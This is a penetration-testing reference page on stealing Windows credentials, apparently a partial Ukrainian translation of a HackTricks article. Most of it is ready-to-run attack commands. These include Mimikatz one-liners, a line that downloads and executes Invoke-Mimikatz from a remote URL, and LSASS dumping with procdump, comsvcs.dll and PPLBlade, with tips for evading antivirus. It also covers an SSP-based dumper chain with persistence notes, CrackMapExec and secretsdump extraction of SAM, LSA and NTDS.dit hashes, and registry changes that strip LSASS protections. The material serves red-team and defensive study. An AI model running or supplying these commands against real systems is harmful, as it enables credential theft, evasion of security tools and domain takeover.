# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Дізнайтеся про інші можливості, які Mimikatz може виконувати на** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ці захисти можуть перешкодити Mimikatz витягнути деякі credentials.**

## Credentials з Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати passwords and hashes** всередині victim.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, Defender його не виявляє.\
Ви можете використати цей інструмент, щоб **dump the lsass process**, **download the dump** і **extract** **credentials locally** з дампа.

Ви також можете використати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **визнати** використання **procdump.exe to dump lsass.exe** за **шкідливе**, це тому, що вони **виявляють** рядок **"procdump.exe" and "lsass.exe"**. Тому більш **приховано** передавати як **аргумент** PID процесу lsass.exe в procdump **замість** імені lsass.exe.

### Dumping lsass with **comsvcs.dll**

DLL з ім'ям **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі аварії. Ця DLL містить **функцію** з ім'ям **`MiniDumpW`**, призначену для виклику через `rundll32.exe`.\
Перші два аргументи не мають значення, натомість третій розділяється на три компоненти. Першим є PID процесу, який треба дампнути; другим — місце розташування файлу дампу; третім компонентом має бути строго слово **full**. Інших варіантів немає.\
Після розбору цих трьох компонентів DLL створює файл дампу та записує в нього пам'ять вказаного процесу.\
Використання **comsvcs.dll** дозволяє зняти дамп процесу lsass без необхідності завантажувати та виконувати procdump. Цей метод детально описаний на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Отримання дампу lsass за допомогою Task Manager**

1. Right click on the Task Bar and click on Task Manager
2. Click on More details
3. Search for "Local Security Authority Process" process in the Processes tab
4. Right click on "Local Security Authority Process" process and click on "Create dump file".

### Отримання дампу lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — підписаний Microsoft бінарний файл, який є частиною пакету [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Знімання дампу lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це Protected Process Dumper Tool, який підтримує обфускацію memory dump та передачу його на віддалені робочі станції без запису на диск.

**Ключові функції**:

1. Обхід захисту PPL
2. Обфускація memory dump файлів для уникнення механізмів виявлення на основі сигнатур Defender
3. Завантаження memory dump за допомогою методів RAW та SMB без запису на диск (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-орієнтований дамп LSASS без MiniDumpWriteDump

Ink Dragon постачає трьохетапний дампер під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки на цей API не спрацьовують:

1. **Етап 1 — завантажувач (`lals.exe`)** – шукає в `fdp.dll` заповнювач, що складається з 32 символів `d` у нижньому регістрі, перезаписує його абсолютним шляхом до `rtu.txt`, зберігає патчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливий DLL як новий Security Support Provider (SSP).
2. **Етап 2 всередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, виконує XOR кожного байта з `0x20` і відображає декодований бінарник у пам'ять перед передачею виконання.
3. **Етап 3 — дампер** – відображений payload повторно реалізує логіку MiniDump, використовуючи **direct syscalls**, резольвлені з імен API за хешем (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціальний експорт з іменем `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснутий дамп LSASS у файл і закриває дескриптор, щоб ексфільтрація могла відбутися пізніше.

Примітки оператора:

* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll` та `rtu.txt` в одному каталозі. Етап 1 перезаписує хардкодний заповнювач абсолютним шляхом до `rtu.txt`, тому рознесення файлів порушує ланцюжок.
* Реєстрація відбувається додаванням `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете встановити це значення самостійно, щоб LSASS підвантажував SSP при кожному завантаженні.
* `%TEMP%\*.ddt` файли — це стиснуті дампи. Розпакуйте локально, потім подайте їх у Mimikatz/Volatility для витягання облікових даних.
* Запуск `lals.exe` вимагає прав admin/SeTcb, щоб `AddSecurityPackageA` пройшов успішно; як тільки виклик повернеться, LSASS прозоро завантажує шахрайський SSP і виконує Етап 2.
* Видалення DLL з диска не вивантажує її з LSASS. Або видаліть запис в реєстрі і перезапустіть LSASS (перезавантаження), або залиште його для довготривалої персистенції.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit з цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Вивантажити історію паролів NTDS.dit із цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб вкрасти ці файли — отримати їх копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ті файли на вашу машину Kali і **витягніть hashes** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Ви можете скопіювати захищені файли за допомогою цієї служби. Для цього потрібні права адміністратора.

#### Using vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але ви можете зробити те саме з **Powershell**. Це приклад того, **як скопіювати SAM file** (жорсткий диск, що використовується — "C:" і він збережений у C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) щоб зробити копію SAM, SYSTEM та ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Облікові дані - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як users та groups.
- **Link Table**: Вона відстежує відносини, наприклад group memberships.
- **SD Table**: **Security descriptors** для кожного об'єкта зберігаються тут, забезпечуючи security та контроль доступу до збережених об'єктів.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Розшифрування хешів всередині NTDS.dit

The hash is cyphered 3 times:

1. Розшифрувати Password Encryption Key (**PEK**) за допомогою **BOOTKEY** і **RC4**.
2. Розшифрувати сам **hash** за допомогою **PEK** і **RC4**.
3. Розшифрувати **hash** за допомогою **DES**.

**PEK** має **однакове значення** на **кожному domain controller**, але він **зашифрований** всередині файлу **NTDS.dit** з використанням **BOOTKEY** файлу **SYSTEM** доменного контролера (is different between domain controllers). This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Копіювання NTDS.dit за допомогою Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати [**volume shadow copy**](#stealing-sam-and-system) трюк, щоб скопіювати файл **ntds.dit**. Пам'ятайте, що вам також потрібна копія **SYSTEM file** (знову ж таки, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) трюк).

### **Витяг хешів з NTDS.dit**

Після того, як ви **отримали** файли **NTDS.dit** і **SYSTEM**, ви можете використовувати інструменти, такі як _secretsdump.py_, щоб **витягти хеші**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **автоматично їх витягти** за допомогою дійсного domain admin користувача:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих файлів NTDS.dit** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Також можна використовувати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Екстракція об'єктів домену з NTDS.dit в базу даних SQLite**

Об'єкти NTDS можна експортувати в базу даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Експортуються не лише секрети, але й самі об'єкти та їхні атрибути, що дозволяє подальший аналіз інформації після отримання сирого файлу NTDS.dit.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive є необов'язковим, але дозволяє розшифрувати секрети (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Разом з іншою інформацією витягується така інформація : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей бінарний файл для витягання credentials з різних програм.
```
lazagne.exe all
```
## Інші інструменти для витягнення облікових даних із SAM та LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використати для витягнення облікових даних із пам'яті. Завантажити його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Витягає облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягти облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **execute it**, і паролі будуть витягнуті.

## Виявлення неактивних RDP-сесій і послаблення контролю безпеки

Ink Dragon’s FinalDraft RAT включає tasker `DumpRDPHistory`, техніки якого корисні для будь-якого red-teamer'а:

### Збір телеметрії в стилі DumpRDPHistory

* **Outbound RDP targets** – розбирайте кожен user hive за шляхом `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підключ зберігає ім'я сервера, `UsernameHint` і timestamp останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – опитуйте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на предмет Event IDs **21** (успішний вхід) та **25** (відключення), щоб визначити, хто адміністрував машину:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Коли ви знатимете, який Domain Admin регулярно підключається, дампніть LSASS (за допомогою LalsDumper/Mimikatz), поки їхня **disconnected** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier і токени в LSASS, які потім можна відтворити через SMB/WinRM, щоб витягти `NTDS.dit` або встановити стійкість на domain controllers.

### Registry downgrades targeted by FinalDraft

Той самий implant також змінює кілька ключів реєстру, щоб полегшити викрадення облікових даних:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Налаштування `DisableRestrictedAdmin=1` змушує повне повторне використання credential/ticket під час RDP, дозволяючи pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` відключає UAC token filtering, тож local admins отримують необмежені tokens через мережу.
* `DSRMAdminLogonBehavior=2` дозволяє DSRM administrator увійти, поки DC онлайн, даючи атакуючим ще один вбудований обліковий запис з високими привілеями.
* `RunAsPPL=0` видаляє LSASS PPL protections, роблячи memory access тривіально для dumpers, таких як LalsDumper.

## Джерела

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
